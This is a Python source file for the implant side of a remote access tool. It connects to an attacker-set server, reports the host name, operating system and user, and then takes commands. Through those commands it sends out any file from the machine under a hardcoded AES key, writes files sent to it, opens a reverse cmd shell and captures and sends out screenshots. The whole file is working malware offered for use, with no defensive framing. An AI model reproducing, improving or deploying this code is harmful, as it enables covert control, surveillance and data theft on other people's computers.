# Agent script

import socket,time
import platform
import getpass,os
import subprocess, threading
from Crypto.Cipher import AES
import pyautogui
from pyautogui import PyAutoGUIException

key = b'ZiyaGadimli12345'
nonce = b'ZiyaGadimli54321'

ciper = AES.new(key, AES.MODE_EAX, nonce) 

def enume():
    hostname = socket.gethostname()
    OSver = platform.platform()
    username = getpass.getuser()

    return {'hostname':hostname, 'OS':OSver, 'username':username}

SERVER_HOST = '127.0.0.1'  # Change this to your server's IP
SERVER_PORT = 5050

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_HOST, SERVER_PORT))

s.send(str(enume()).encode())

print("[+] Connected to server")

def download(file_path):
    # file_path_ = s.recv(4096).decode()
    try:
        file = open(file_path, 'rb')
        a = file.read(4096)
        a = ciper.encrypt(a)
        while a:
            s.send(a)
            a = file.read(4096)
            a = ciper.encrypt(a)
        time.sleep(1)
        s.send(ciper.encrypt(b"\n\r"))
        file.close()
    except FileNotFoundError:
        pass
        

def upload():
    path = s.recv(4096).decode()
    if os.path.isdir(path):
        if not path.endswith('\\'):
            path += '\\'
        file_name = s.recv(4096).decode()
        path += file_name
        file = open(path, 'ab')
        a = s.recv(4096)
        a = ciper.decrypt(a)
        while a != b"\n\r":
            file.write(a)
            a = s.recv(4096)
            a = ciper.decrypt(a)
        file.close()
        print("File sent succesfully!")
    else:
        print("\n[*] It looks like the path you entered is not path.Double check it please")

def rev_shell(socket):
    

    def s2p(s, p):
        while True:
            data = s.recv(1024)
            if data == 'exit':
                s.close()
                break
            if len(data) > 0 :
                p.stdin.write(data)
                p.stdin.flush()

    def p2s(s, p):
        while True:
            s.send(p.stdout.read(1))

    s = socket

    p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

    s2p_thread = threading.Thread(target=s2p, args=[s, p])
    s2p_thread.daemon = True
    s2p_thread.start()

    p2s_thread = threading.Thread(target=p2s, args=[s, p])
    p2s_thread.daemon = True
    p2s_thread.start()

    try:
        p.wait()
    except KeyboardInterrupt:
        s.close()


def ss():
    
    try:
        my_screenshot = pyautogui.screenshot()
        file_name = "screenshoot_" + time.ctime().split()[3].replace(':', '-') + '.png'

        path = "C:\\Windows\\Temp\\" + file_name

        my_screenshot.save(path)
        time.sleep(2)
        
        s.send(path.encode())
        print("PATH SENT!")

        download(file_path=path)
    except PyAutoGUIException:
        s.send(b"\nUnable to take screenshoot")


while 1:
    command = s.recv(409600).decode()
    print(command)
    command = command.split()

    match command[0]:
        case 'download':
            download(file_path=command[1])
        case 'upload':
            upload()
        case 'shell':
            time.sleep(1)
            rev_shell(socket=s)
        case 'ss':
            ss()


